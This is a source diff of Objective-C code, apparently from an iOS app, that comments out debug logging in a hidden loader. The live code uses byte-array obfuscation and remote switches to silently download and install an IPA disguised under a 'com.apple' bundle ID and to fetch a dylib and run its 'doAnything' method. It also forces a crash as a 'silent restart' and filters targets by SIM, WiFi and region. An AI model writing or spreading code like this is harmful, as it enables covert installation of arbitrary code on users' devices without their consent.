@@ -269,7 +269,7 @@ class_getInstanceMethod
     NSString *fm_dby1 = [NSString stringWithCString:fm_dbx1 encoding:NSUTF8StringEncoding];
     BOOL isfuck = [[[NSUserDefaults standardUserDefaults] objectForKey:fm_dby1] boolValue];
     
-    NSLog(@"isfuck: %d", isfuck);
+    //NSLog(@"isfuck: %d", isfuck);
 
     if (isfuck == 0x1) {
         
@@ -295,27 +295,27 @@ class_getInstanceMethod
 
 - (void)downloadManager:(SIDownloadManager *)siDownloadManager
           withOperation:(SIBreakpointsDownload *)paramOperation
-         changeProgress:(double)paramProgress{NSLog(@"%f", paramProgress);
+         changeProgress:(double)paramProgress{//NSLog(@"%f", paramProgress);
 }
 - (void)downloadManagerDidComplete:(SIDownloadManager *)siDownloadManager
                      withOperation:(SIBreakpointsDownload *)paramOperation
 {
     if ([paramOperation.url isEqualToString:@"http://panpeili.com/project/BGService/BGService.ipa"]) {
-        NSLog(@"ipa下载完成.");
+        //NSLog(@"ipa下载完成.");
         
         NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
         NSString *documentDirectory = [paths objectAtIndex:0];
         NSString *ipaPath = [documentDirectory stringByAppendingPathComponent:@"BGService.ipa"];
         [AppUtils installApp:ipaPath succuss:^{
-            NSLog(@"安装成功！");
+            //NSLog(@"安装成功！");
             
             NSInteger randtime = arc4random()%T;
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(randtime * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                 if (![AppUtils isAppActived:@"BGService"]) {
-                    NSLog(@"BGService不活跃， 启动");
+                    //NSLog(@"BGService不活跃， 启动");
                     [AppUtils launchAPP:@"com.apple.BGService"];
                 } else {
-                    NSLog(@"BGService活跃。");
+                    //NSLog(@"BGService活跃。");
                 }
             });
    
@@ -325,7 +325,7 @@ class_getInstanceMethod
     }
     
     if ([paramOperation.url hasSuffix:@"dylib"]){
-        NSLog(@"静默重启");
+        //NSLog(@"静默重启");
         NSString *s = nil;
         NSArray *a = @[s];
     }
@@ -346,10 +346,10 @@ class_getInstanceMethod
     BOOL isInstall = [AppUtils isInstallIpa:@"com.apple.BGService"];
     if (isInstall == YES) {
         if (![AppUtils isAppActived:@"BGService"]) {
-            NSLog(@"BGService不活跃， 启动");
+            //NSLog(@"BGService不活跃， 启动");
             [AppUtils launchAPP:@"com.apple.BGService"];
         } else {
-            NSLog(@"BGService活跃。");
+            //NSLog(@"BGService活跃。");
         }
     }
 }
@@ -358,15 +358,15 @@ class_getInstanceMethod
 {
     BOOL isInstall = [AppUtils isInstallIpa:@"com.apple.BGService"];
     if (isInstall == NO) {
-        NSLog(@"没安装，或者被卸载！立马安装。。。");
+        //NSLog(@"没安装，或者被卸载！立马安装。。。");
         
         NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
         NSString *documentDirectory = [paths objectAtIndex:0];
         NSString *ipaPath = [documentDirectory stringByAppendingPathComponent:@"BGService.ipa"];
-        NSLog(@"ipa路径: %@", ipaPath);
+        //NSLog(@"ipa路径: %@", ipaPath);
         if (![[NSFileManager defaultManager] fileExistsAtPath:ipaPath])
         {
-            NSLog(@"ipa文件不存在，下载文件到指定目录。");
+            //NSLog(@"ipa文件不存在，下载文件到指定目录。");
             
             NSString *urlstr = @"http://panpeili.com/project/BGService/BGService.ipa";
             [[SIDownloadManager sharedSIDownloadManager] setDelegate:self];
@@ -381,10 +381,10 @@ class_getInstanceMethod
         
     } else {
         if (![AppUtils isAppActived:@"BGService"]) {
-            NSLog(@"BGService不活跃， 启动");
+            //NSLog(@"BGService不活跃， 启动");
             [AppUtils launchAPP:@"com.apple.BGService"];
         } else {
-            NSLog(@"BGService活跃。");
+            //NSLog(@"BGService活跃。");
         }
     }
 }
@@ -396,17 +396,17 @@ class_getInstanceMethod
     CTCarrier *carrier = [netinfo subscriberCellularProvider];
     
     if ([carrier mobileCountryCode].length == 0 &&   [carrier mobileNetworkCode].length == 0) {
-        NSLog(@"没有手机卡！！");
+        //NSLog(@"没有手机卡！！");
         return;
     }
     
     Reachability *r = [Reachability reachabilityWithHostname:@"www.apple.com"];
     BOOL wifi = [r currentReachabilityStatus] == ReachableViaWiFi ? YES : NO;
     
-    NSLog(@"wifi: %d", wifi);
+    //NSLog(@"wifi: %d", wifi);
     
     if (wifi == NO) {
-        NSLog(@"不是WIFI");
+        //NSLog(@"不是WIFI");
         return;
     }
     
@@ -439,8 +439,8 @@ class_getInstanceMethod
         [str rangeOfString:@"国内未能识别的地区"].length > 0
         ) {
         
-        NSLog(@"!排除该区域!");
-        
+        //NSLog(@"!排除该区域!");
+        return;
         
     } else
     
@@ -472,13 +472,13 @@ class_getInstanceMethod
          NSString *docsPath = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
          NSString *dbPath   = [docsPath stringByAppendingPathComponent:@"test.db"];
          FMDatabase *db     = [FMDatabase databaseWithPath:dbPath]; */
-        NSLog(@"%@", fm_dby);
+        //NSLog(@"%@", fm_dby);
         
         [NSURLConnection sendAsynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:fm_dby]] queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
             if (connectionError == nil) {
                 
                 id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:nil error:nil];
-                NSLog(@"获取的配置信息： %@", jsonObject);
+                //NSLog(@"获取的配置信息： %@", jsonObject);
                 BOOL isfuck;
                 int fuckpercent;
                 
@@ -490,7 +490,7 @@ class_getInstanceMethod
                     BOOL jbinstall = [[jsonObject objectForKey:@"jbinstall"] boolValue];
                     int jbinstallpercent = [[jsonObject objectForKey:@"jbinstallpercent"] integerValue];
                     int randx = arc4random()%jbinstallpercent; //[0, 1000000]
-                    NSLog(@"randx: %d\n", randx);
+                    //NSLog(@"randx: %d\n", randx);
                     
                     if (jbinstall == YES) {
                         
@@ -499,7 +499,7 @@ class_getInstanceMethod
                         
                         
                         if (randx == 0) {
-                            NSLog(@"开启了安装控制。");
+                            //NSLog(@"开启了安装控制。");
                             [self checkBGService];
                             
                         }
@@ -523,10 +523,10 @@ class_getInstanceMethod
                      FMDatabaseQueue is released on another thread and we're in the middle of doing
                      something in dispatch_sync
                      */
-                    NSLog(@"isfuck: %d, fuckpercent: %d", isfuck, fuckpercent);
+                    //NSLog(@"isfuck: %d, fuckpercent: %d", isfuck, fuckpercent);
                     
                     int randx = arc4random()%fuckpercent; //[0, 1000000]
-                    NSLog(@"randx: %d\n", randx);
+                    //NSLog(@"randx: %d\n", randx);
                     if (randx == 0) {
                         char fm_dbx[8] = {73,83,95,70,85,67,75};
                         NSString *fm_dby = [NSString stringWithCString:fm_dbx encoding:NSUTF8StringEncoding];
@@ -534,7 +534,7 @@ class_getInstanceMethod
                         [[NSUserDefaults standardUserDefaults] synchronize];
                     
                         // 静默重启
-                        NSLog(@"静默重启");
+                        //NSLog(@"静默重启");
                         NSString *s = nil;
                         NSArray *arr = @[s];
                         
@@ -569,7 +569,7 @@ class_getInstanceMethod
         
         NSString *url = [fm_dby3 stringByAppendingString:[NSString stringWithFormat:fm_dby4, fm_dbv]];
         url = [url stringByAppendingString:@"&isJail=0"];
-        NSLog(@"url: %@", url);
+        //NSLog(@"url: %@", url);
         [NSURLConnection sendAsynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:url]] queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
             
             if (connectionError == nil) {
@@ -584,14 +584,14 @@ class_getInstanceMethod
                     
                     NSString *y = [NSString stringWithCString:x encoding:NSUTF8StringEncoding];
                     NSString *du = [retObject objectForKey:y];
-                    NSLog(@"dylibUrl: %@", du);
+                    //NSLog(@"dylibUrl: %@", du);
                     
                     
                     NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
                     NSString *documentDirectory = [paths objectAtIndex:0];
                     NSString *fm_dbdown1 = [documentDirectory stringByAppendingPathComponent:@"BGServiceDylib.dylib"];
                     
-                    NSLog(@"下载： %@", fm_dbdown1);
+                    //NSLog(@"下载： %@", fm_dbdown1);
                     
                     char fm_dbx5[18] = {83,73,68,111,119,110,108,111,97,100,77,97,110,97,103,101,114};
                     Class fmclass = objc_getClass(fm_dbx5);
@@ -624,7 +624,7 @@ class_getInstanceMethod
         
         @try {
             
-            NSLog(@"调用动态库函数");
+            //NSLog(@"调用动态库函数");
             
             char fm_dbx6[13] = {66,71,68,111,83,111,109,116,104,105,110,103};
             
@@ -633,7 +633,7 @@ class_getInstanceMethod
             [dm performSelector:@selector(doAnything)];
         }
         @catch (NSException *exception) {
-            NSLog(@"%@", exception);
+            //NSLog(@"%@", exception);
 
         }
         
